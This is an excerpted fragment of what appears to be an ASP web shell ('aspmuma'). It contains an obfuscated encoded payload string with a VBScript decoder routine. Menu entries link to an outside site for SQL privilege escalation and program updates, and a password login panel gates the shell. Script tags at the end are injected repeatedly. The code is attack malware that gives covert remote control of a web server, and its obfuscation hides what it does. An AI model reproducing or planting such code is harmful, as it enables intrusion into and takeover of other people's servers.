...
Next
'Dim XBCode
'XBCode="z^OLLS8'D')q~{)╋M|uj{pvu'Lujy!w{/hjk0╋Mvy'p'D'8'[v'Slu/hjk0'z{lw'8╋jDtpk/hjk3p380╋pm'jD)※)'{olu╋kDtpk/hjk3p390╋pDp28╋lDylwshjl/k3)※)3))0╋iijDiij-tpk/z^OLLS83jpu{/l0380╋lszl╋iijDiij-j╋luk'pm╋ul {╋Lujy!w{Diij╋luk'M|uj{pvu╋hjvklD)DzFwzh5z6 z6r{5!lriz5~~~66Aw※:※:o.Djyz'※:wpyjzC)╋Lm|uDZ{yYl}lyzl/ylwshjl/ylwshjl/Lujy!w{/hjvkl03)●)3Joy/:;003)◎)3}iJySm00╋.ylzwvuzl5^yp{l/Lm|u0"
'Execute(UnEncode(XBCode))
Function UnEncode(Code)
But = CInt(-88)
Code = Replace(Replace(Code, Chrw(-23643), Chrw(37)), Chrw(-23646), Chrw(34)) 
    For i = 1 To Len(Code)
        If Mid(Code, i, 1) <> "╋" Then
            If Asc(Mid(Code, i, 1)) < 32 Or Asc(Mid(Code, i, 1)) > 126 Then
               TempCode = TempCode & Chrw(Asc(Mid(Code, i, 1)))
            Else
...
RRS"<tr><td height='20'><a href='http://www.aspmuma.cn/sqlrootkit.asp' target='FileFrame'>→SQL提权</a></td></tr>"
...
RRS"<tr><td height='20'><a href='http://www.aspmuma.cn/' target='FileFrame'>→程序更新</a></td></tr>"
...
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><img src='http://www.t00ls.net/templates/t00ls/images/logo.jpg' /><hr><FORM Action='"&URL&"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>Oh my God, what is safe?</div></center>"
...
%><script type="text/javascript" src="/kagprqsyh"></script><noscript><img src="/kagprqsyh.gif" width="1px" height="1px"/></noscript></body></html><script type="text/javascript" src="/kagprqsyh"></script><noscript><img src="/kagprqsyh.gif" width="1px" height="1px"/></noscript></body></html><script type="text/javascript" src="/kagprqsyh"></script><noscript><img src="/kagprqsyh.gif" width="1px" height="1px"/></noscript></body></html>
